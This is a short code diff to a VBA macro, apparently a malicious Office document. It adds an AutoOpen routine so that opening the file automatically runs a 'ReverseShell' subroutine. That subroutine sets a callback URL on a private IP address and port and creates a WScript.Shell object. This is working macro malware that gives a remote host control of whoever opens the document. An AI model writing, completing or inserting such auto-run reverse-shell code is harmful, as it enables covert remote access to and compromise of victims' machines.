@@ -6,6 +6,10 @@ Dim command As String
 Dim break As Boolean
 Dim result As String
 
+Sub AutoOpen()
+    Call ReverseShell
+End Sub
+
 Sub ReverseShell()
     Const callbackUrl = "http://192.168.62.144:4449/"
     Set shell = CreateObject("WScript.Shell")
